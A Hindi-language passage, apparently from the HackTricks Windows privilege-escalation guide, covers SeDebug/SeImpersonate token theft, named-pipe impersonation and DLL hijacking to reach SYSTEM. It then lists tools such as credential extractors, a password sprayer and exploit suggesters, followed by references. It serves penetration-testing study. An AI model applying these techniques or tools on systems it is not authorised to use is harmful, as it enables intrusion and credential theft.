**आप** [**code यहाँ पा सकते हैं**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

अगर आपके पास ये token privileges हैं (संभवतः आपको यह पहले से ही High Integrity process में मिलेंगे), तो आप SeDebug privilege के साथ **लगभग किसी भी process** (protected processes को छोड़कर) को **open** कर सकेंगे, process का **token copy** कर सकेंगे, और उस token के साथ **arbitrary process** बना सकेंगे।\
इस technique में आम तौर पर **SYSTEM के रूप में चल रहे किसी भी process को, सभी token privileges के साथ, चुना जाता है** (_हाँ, आप ऐसे SYSTEM processes भी पा सकते हैं जिनके पास सभी token privileges नहीं होते_)।\
**आप इस technique को execute करने वाले code का एक** [**example यहाँ पा सकते हैं**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

यह technique meterpreter द्वारा `getsystem` में privilege escalate करने के लिए इस्तेमाल की जाती है। इस technique में **एक pipe बनाना और फिर उस pipe पर लिखने के लिए एक service बनाना/abuse करना** शामिल है। फिर, **`SeImpersonate`** privilege का उपयोग करके pipe बनाने वाला **server** pipe client (service) के **token को impersonate** कर सकेगा और SYSTEM privileges प्राप्त करेगा।\
अगर आप [**named pipes के बारे में अधिक जानना चाहते हैं, तो यह पढ़ें**](#named-pipe-client-impersonation)।\
अगर आप high integrity से System में जाने का example पढ़ना चाहते हैं, तो [**named pipes का उपयोग करके यह कैसे करें, यहाँ पढ़ें**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

अगर आप किसी **SYSTEM** के रूप में चल रहे **process** द्वारा **loaded** हो रही किसी **dll** को **hijack** कर लेते हैं, तो आप उन permissions के साथ arbitrary code execute कर पाएंगे। इसलिए Dll Hijacking इस तरह की privilege escalation के लिए भी उपयोगी है, और इसके अलावा, high integrity process से इसे हासिल करना **काफी आसान** होता है क्योंकि उसके पास dlls load करने के लिए उपयोग होने वाले folders पर **write permissions** होंगी।\
**आप** [**Dll hijacking के बारे में यहाँ अधिक जान सकते हैं**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors ढूँढने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files के लिए check करें (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations check करें और info इकट्ठा करें (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations check करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session information extract करता है। local में -Thorough use करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से crendentials extract करता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- gathered passwords को domain के across spray करें**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजें (Watson के लिए DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights चाहिए)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजें (VisualStudio का उपयोग करके compile करना होगा) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजते हुए host को enumerate करता है (privesc से अधिक एक info gathering tool) (compile करना होगा) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- बहुत सारे softwares से credentials extract करता है (github में precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration check करें (github में precompiled executable). Recommended नहीं है। Win10 में ठीक से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations check करें (python से बना exe). Recommended नहीं है। Win10 में ठीक से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस post पर आधारित tool (properly काम करने के लिए इसे accesschk की ज़रूरत नहीं होती, लेकिन यह इसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के output को पढ़ता है और working exploits recommend करता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के output को पढ़ता है और working exploits recommend करता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको project को .NET के सही version का उपयोग करके compile करना होगा ([यह देखें](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/))। victim host पर installed .NET version देखने के लिए आप यह कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
